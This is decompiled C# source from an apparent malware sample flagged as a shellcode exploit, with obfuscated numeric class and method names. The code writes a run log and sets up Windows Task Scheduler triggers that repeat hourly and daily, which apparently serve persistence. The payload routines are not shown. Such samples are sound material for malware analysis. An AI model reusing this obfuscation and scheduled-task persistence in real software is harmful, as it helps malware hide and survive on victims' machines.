// Decompiled with JetBrains decompiler
// Type: 069511259246.Core.644230754300
// Assembly: 069511259246, Version=1.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 6D0FD131-484D-4146-B8A3-FCA5C0E4E111
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-e7ff83830fd4bf4e75004c85a34aa787b5c6b7dedba3c5ff9843edd5e688f2d5.exe

using \u003069511259246.Utils;
using \u003181733712633;
using \u003394945002633;
using \u003467582338400;
using \u003963809348773;
using Microsoft.Internal.VisualStudio.Shell;
using Microsoft.Win32.TaskScheduler;
using System;
using System.IO;
using System.Threading;

namespace \u003069511259246.Core
{
  public static class \u003644230754300
  {
    public static void \u003338599550920()
    {
      File.WriteAllText(Path.Combine(\u003792907266257.\u003135826589093(), "last-run.log"), string.Format("{0}{1}{1}", (object) DateTime.Now, (object) Environment.NewLine));
      \u003260266606962.\u003956051762345();
      \u003582007484390.\u003897438076630();
    }

    private static TimeTrigger \u003805090547117()
    {
      TimeTrigger timeTrigger = new TimeTrigger();
      ((Trigger) timeTrigger).StartBoundary = new DateTime(2017, 1, 1);
      ((Trigger) timeTrigger).Repetition.Interval = TimeSpan.FromHours(1.0);
      ((Trigger) timeTrigger).Repetition.StopAtDurationEnd = false;
      ((Trigger) timeTrigger).Enabled = true;
      return timeTrigger;
    }

    private static TimeTrigger \u003466978187378()
    {
      DateTime dateTime = DateTime.Now.AddDays(1.0);
      return new TimeTrigger(new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, 0, 0, 1));
    }

    internal static void \u003841681068736()
    {
      \u003583869048597.\u003751171565885 = Thread.CurrentThread.ManagedThreadId;
      \u003583869048597.\u003987733216135 = true;
      \u003583869048597.\u003812862194449.\u003482711760662();
      // ISSUE: variable of a compiler-generated type
      IVsTelemetryService telemetryService = TelemetryHelper.TelemetryService;
    }
  }
}
